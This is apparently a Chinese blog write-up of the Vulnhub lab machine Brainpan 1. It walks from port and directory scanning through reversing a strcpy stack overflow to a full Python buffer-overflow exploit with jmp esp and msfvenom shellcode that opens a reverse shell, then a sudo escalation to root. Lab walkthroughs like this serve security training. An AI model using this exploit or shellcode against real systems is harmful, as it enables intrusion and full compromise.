---
title: Vulnhub - Brainpan の Write-Up
date: 2020-11-20 16:25:49
categories:
- WriteUPs
- Vulnhub
tags:
- Web
- Reverse
---
## Description

&emsp;&emsp;`Vulnhub`靶机`Brainpan`系列的第一台。整体难度中等。

<!-- more -->

## Step 1

&emsp;&emsp;首先找靶机IP：

![](/img/Brainpan1/Brainpan1.png)

&emsp;&emsp;扫描靶机开放端口：

![](/img/Brainpan1/Brainpan2.png)

## Step 2

&emsp;&emsp;9999端口：

![](/img/Brainpan1/Brainpan3.png)

&emsp;&emsp;看起来需要一个密码，只能先跳过。

&emsp;&emsp;10000端口是http的服务，浏览器看上去只是一张图片的静态页面：

![](/img/Brainpan1/Brainpan4.png)

&emsp;&emsp;目录扫描发现有个bin目录：

![](/img/Brainpan1/Brainpan5.png)

&emsp;&emsp;访问bin目录，有个exe文件：

![](/img/Brainpan1/Brainpan6.png)

## Step 3

&emsp;&emsp;通过IDA逆向之后发现这是9999端口运行的程序：

![](/img/Brainpan1/Brainpan7.png)

&emsp;&emsp;在程序中发现一个`get_reply`函数：

![](/img/Brainpan1/Brainpan8.png)

&emsp;&emsp;在函数中可以看到调用strcpy，而在主函数中&Dest长度可以到1000字节，get_reply函数中Source只有0x208字节即520字节。所以这里存在栈溢出漏洞，当填充了`520(Source_data)+4(EBP)`总共524字节的数据之后就可以控制函数的返回地址。

&emsp;&emsp;由于程序中没有可以直接getshell的函数，所以需要我们将shellcode写入的buf中，通过jmp esp命令控制程序跳转到buf执行命令。

&emsp;&emsp;在程序中找到311712F3的地址有jmp esp指令，再通过msfvenom生成payload：

![](/img/Brainpan1/Brainpan9.png)

&emsp;&emsp;最终的利用脚本为：

```Python
import socket

target_ip = '172.16.83.3'
target_port = 9999

# padding with 'a'
padding = '\x61' * 524

# address of 'jmp esp' command - 0x311712F3
jmp_esp = '\xF3\x12\x17\x31'

# shellcode
buf =  b""
buf += "\x90" * 30
buf += b"\xbf\x23\x22\x77\xf6\xd9\xe1\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x12\x31\x7a\x12\x03\x7a\x12\x83\xc9\xde\x95"
buf += b"\x03\x3c\xc4\xad\x0f\x6d\xb9\x02\xba\x93\xb4\x44\x8a"
buf += b"\xf5\x0b\x06\x78\xa0\x23\x38\xb2\xd2\x0d\x3e\xb5\xba"
buf += b"\x21\xd0\x16\x38\x52\xd3\x98\x2d\xfe\x5a\x79\xfd\x98"
buf += b"\x0c\x2b\xae\xd7\xae\x42\xb1\xd5\x31\x06\x59\x88\x1e"
buf += b"\xd4\xf1\x3c\x4e\x35\x63\xd4\x19\xaa\x31\x75\x93\xcc"
buf += b"\x05\x72\x6e\x8e"

payload = padding + jmp_esp + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((target_ip, target_port))

s.recv(1024)
s.send(payload)
```

&emsp;&emsp;运行脚本之后就可以获取反弹shell：

![](/img/Brainpan1/Brainpan10.png)

## Step 4

&emsp;&emsp;根据之前靶机题权最简单的方式，直接查看sudo权限，提示我们可以以root权限运行`/home/anansi/bin/anansi_util`：

![](/img/Brainpan1/Brainpan11.png)

&emsp;&emsp;sudo执行之后根据命令提示可以直接接命令，所以当接上`/bin/bash`命令之后就可以获得root权限的shell。
